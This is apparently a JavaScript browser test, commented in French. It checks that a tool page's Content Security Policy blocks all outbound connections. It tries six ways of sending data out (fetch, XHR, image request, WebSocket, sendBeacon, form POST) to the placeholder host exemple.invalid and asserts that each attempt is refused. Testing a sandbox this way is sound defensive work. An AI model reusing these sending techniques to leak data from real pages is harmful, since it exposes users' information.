// « Les règles de sécurité de l'outil refusent toute connexion sortante » — essayé, pas seulement affirmé : six formes d'envoi, tentées de l'intérieur de la page, vers
// une adresse qui n'existe pas. La politique de sécurité de la page (default-src 'none'; connect-src blob: data:; form-action 'none'…) doit refuser chacune, avant qu'un
// paquet ne parte : le navigateur le dit par un événement de violation, et aucune réponse n'arrive.
const { test, expect } = require('./aide');

const FORMES = ['fetch', 'xhr', 'image', 'websocket', 'beacon', 'formulaire'];

test('six formes d\'envoi depuis la page : toutes refusées par la politique de sécurité, aucune réponse', async ({ app, page }) => {
  const reponses = [];
  page.on('response', (r) => { if (/exemple\.invalid/.test(r.url())) reponses.push(r.url()); });
  const bilan = await page.evaluate(async () => {
    const violations = [];
    document.addEventListener('securitypolicyviolation', (e) => violations.push({ directive: e.effectiveDirective, url: e.blockedURI }));
    const attendre = (ms) => new Promise((r) => setTimeout(r, ms));
    const essais = {
      fetch: () => fetch('http://exemple.invalid/a', { method: 'POST', body: 'donnee' }).then(() => 'envoyé', () => 'refusé'),
      xhr: () => new Promise((r) => { const x = new XMLHttpRequest(); x.open('POST', 'http://exemple.invalid/b'); x.onerror = () => r('refusé'); x.onload = () => r('envoyé'); try { x.send('donnee'); } catch (e) { r('refusé'); } }),
      image: () => new Promise((r) => { const i = new Image(); i.onerror = () => r('refusé'); i.onload = () => r('envoyé'); i.src = 'http://exemple.invalid/c.png?d=donnee'; }),
      websocket: () => new Promise((r) => { try { const w = new WebSocket('ws://exemple.invalid/d'); w.onerror = () => r('refusé'); w.onopen = () => r('envoyé'); } catch (e) { r('refusé'); } }),
      beacon: async () => { try { navigator.sendBeacon('http://exemple.invalid/e', 'donnee'); } catch (e) { return 'refusé'; } await attendre(300); return 'tenté'; },
      formulaire: async () => {
        const f = document.createElement('form'); f.method = 'POST'; f.action = 'http://exemple.invalid/f'; f.target = '_blank';
        const i = document.createElement('input'); i.name = 'x'; i.value = 'donnee'; f.appendChild(i); document.body.appendChild(f);
        try { f.submit(); } catch (e) { return 'refusé'; }
        await attendre(300); f.remove(); return 'tenté';
      },
    };
    const resultats = {};
    for (const [nom, essai] of Object.entries(essais)) {
      const avant = violations.length;
      resultats[nom] = { resultat: await essai(), violations: 0 };
      await attendre(150);
      resultats[nom].violations = violations.length - avant;
    }
    return { resultats, violations };
  });
  expect(Object.keys(bilan.resultats)).toEqual(FORMES);
  for (const f of FORMES) {
    expect(bilan.resultats[f].resultat, f + ' ne part pas').not.toBe('envoyé');
    expect(bilan.resultats[f].violations, f + ' : le navigateur dit avoir refusé (violation de la politique de sécurité)').toBeGreaterThanOrEqual(1);
  }
  expect(reponses, 'aucune réponse d\'une adresse extérieure').toEqual([]);
});
